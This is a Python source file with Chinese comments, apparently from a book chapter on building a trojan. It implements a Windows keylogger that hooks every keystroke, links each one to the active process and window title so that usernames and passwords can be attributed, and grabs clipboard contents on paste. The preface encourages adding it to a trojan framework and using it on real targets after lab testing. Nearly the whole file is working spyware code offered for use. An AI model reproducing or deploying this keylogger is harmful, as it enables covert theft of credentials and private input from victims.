# -*- coding:utf8 -*-
"""
前言：
        我们在部署木马服务端的时候，通常希望它能完成一些常见的任务，如抓取按键记录，截取屏幕快照或执行
    shellcode以提供可与CANVAS或Metasploit等工具进行交互的会话，这些功能是我们本章关注的内容。
    我们还将穿插介绍一些沙盒的检测技术，用来确认我们的木马是否运行在反病毒或取证软件的沙盒中。
    你可以很容易地修改本章介绍的这些模块。然后将它集成到我们的木马框架中。
        在后面几章，我们将介绍基于浏览器的中间人攻击方法及权限提升技术，这些技术也可以集成到你的木马中。
    我们介绍的每一项技术都有一定的挑战性，可能会被终端用户或反病毒软件所捕获。我建议你在完成木马的部署之后
    尽量小心测试一些新的模块。你可以在实验环境下测试这些模块，然后再将它们用到真实的目标上。
    下面以创建一个简单的键盘嗅探器开始.

"""
#   代码功能:   键盘嗅探器
from ctypes import *
import pythoncom

"""
        PyHook能让我们很容易地捕获所有的键盘时间。它利用了原生的Windows 函数 SetWindowsHookEX,
    这个函数允许我们安装自定义的钩子函数，当特定的Windows事件发生时，这个钩子函数就会被调用。
        我们通过注册键盘事件的钩子函数就能捕获目标机器触发的所有按键信息。此外，我们还应该知道是哪些
    进程执行了这些按键，这样我们才能确定用户名，密码和其他一些有用信息的所属对象。PyHook库为我们
    封装了所有的这些底层编程方法，我们只需要关注键盘记录的核心逻辑    
"""
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获取目标桌面上当前活动窗口的句柄
    hwnd = user32.GetForegroundWindow()

    # 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 保存当前进程ID
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer(b"\x00" * 512)
    # 打开进程
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    # 获取进程所对应的可执行文件的名字
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # 输出进程相关信息
    print("                                                     ")
    print("[ PID: %s - %s - %s]" % (process_id, executable.value, window_title.value))
    print("                                                     ")

    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def keyStore(event):
    global current_window

    # 检查目标是否切换了窗口
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # 检测按键是否为常规按键(非组合键等)
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), )
    else:
        # 若输入为[CTRL-V],则获取剪切板内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print("[PASTE] - %s" % (pasted_value), )

        else:
            print("[%s]" % event.Key, )

    # 返回直到下一个钩子事件被触发
    return True


#   创建和注册钩子函数管理器
k1 = pyHook.HookManager()
#   将自定义的回调函数KeyStroke与KeyDown事件进行了绑定
k1.KeyDown = keyStore

#   注册键盘记录的钩子，然后永久执行(钩住所有的按键事件)
k1.HookKeyboard()
pythoncom.PumpMessages()
